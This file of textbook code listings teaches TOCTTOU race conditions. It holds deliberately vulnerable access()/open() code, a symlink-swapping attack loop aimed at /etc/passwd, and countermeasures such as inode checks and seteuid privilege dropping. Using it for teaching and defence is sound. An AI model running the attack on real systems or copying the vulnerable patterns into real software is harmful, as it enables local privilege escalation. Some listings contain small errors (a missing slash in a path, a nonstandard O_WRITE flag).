/******************************
 * Code in Chapter 7
 ******************************/




/**********************************************
 * Listing 7.1: A code example with a race condition vulnerability
 **********************************************/

if (!access("/tmp/X", W_OK)) {
      /* the real user has the write permission*/
      f = open("/tmp/X", O_WRITE);
          write_to_file(f);
}
else {
     /* the real user does not have the write permission */
     fprintf(stderr, "Permission denied\n");
}



/**********************************************
 * Listing 7.2: Another code example with the race condition vulnerability
 **********************************************/ 

file = "/tmp/X";
fileExist = check_file_existence(file);

if (fileExist == FALSE){
  // The file does not exist, create it.
  f = open(file, O_CREAT);

  // write to file
  ...
}



/**********************************************
 * Listing 7.3 vulp.c - Program with the TOCTTOU race condition vulnerability
 **********************************************/ 

#include <stdio.h>
#include <unistd.h>

int main()
{
   char * fn = "/tmp/XYZ";
   char buffer[60];
   FILE *fp;

   /* get user input */
   scanf("%50s", buffer);

   if(!access(fn, W_OK)){
        fp = fopen(fn, "a+");
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
   }
   else printf("No permission \n");

   return 0;
}



/**********************************************
 * Listing 7.4: The target process target_process.sh
 **********************************************/ 

#!/bin/sh

while :
do
   ./vulp < passwd_input
done



/**********************************************
 * Listing 7.5: The attack process attack_process.c
 **********************************************/ 

#include <unistd.h>

int main()
{
   while(1) {
     unlink("/tmp/XYZ");
     symlink("/home/seed/myfile", "/tmp/XYZ");
     usleep(10000);

     unlink("/tmp/XYZ");
     symlink("/etc/passwd", "/tmp/XYZ");
     usleep(10000);
   }

   return 0;
}



/**********************************************
 * Listing 7.6: The revised target process target_process.sh
 **********************************************/ 

#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]   
do
   ./vulp < passwd_input     
   new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"




/**********************************************
 * Listing 7.7: Repeating access and open
 **********************************************/ 

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

int main()
{
   struct stat stat1, stat2, stat3;
   int fd1, fd2, fd3;

   if (access("tmp/XYZ", O_RDWR)) {
      fprintf(stderr, "Permission denied\n");
      return -1;
   }                                     
   else fd1 = open("/tmp/XYZ", O_RDWR);
                                         
   if (access("tmp/XYZ", O_RDWR)) {
      fprintf(stderr, "Permission denied\n");
      return -1;
   }                                     
   else fd2 = open("/tmp/XYZ", O_RDWR);
                                         
   if (access("tmp/XYZ", O_RDWR)) {
      fprintf(stderr, "Permission denied\n");
      return -1;
   }                                     
   else fd3 = open("/tmp/XYZ", O_RDWR);

   // Check whether fd1, fd2, and fd3 has the same inode.
   fstat(fd1, &stat1);
   fstat(fd2, &stat2);
   fstat(fd3, &stat3);

   if(stat1.st_ino == stat2.st_ino && stat2.st_ino == stat3.st_ino) {
      // All 3 inodes are the same.
      write_to_file(fd1);
   }
   else {
      fprintf(stderr, "Race condition detected\n");
      return -1;
   }
   return 0;
}



/**********************************************
 * Listing 7.8: An experiment on the sticky symlink protection
 **********************************************/ 

int main()
{
   char *fn = "/tmp/XYZ";
   FILE *fp;

   fp = fopen(fn, "r");
   if(fp == NULL) {
      printf("fopen() call failed \n");
      printf("Reason: %s\n", strerror(errno));
   }
   else
     printf("fopen() call succeeded \n");
   fclose(fp);
   return 0;
}


/**********************************************
 * Code on Page 135 (Section 7.5.4)
 **********************************************/ 

 uid_t real_uid = getuid();  // Get the real user id
 uid_t eff_uid  = geteuid(); // Get the effective user id

 seteuid (real_uid);     

 f = open("/tmp/X", O_WRITE);
 if (f != -1)
     write_to_file(f);
 else
    fprintf(stderr, "Permission denied\n");

 seteuid (eff_uid); // If needed, restore the root privilege




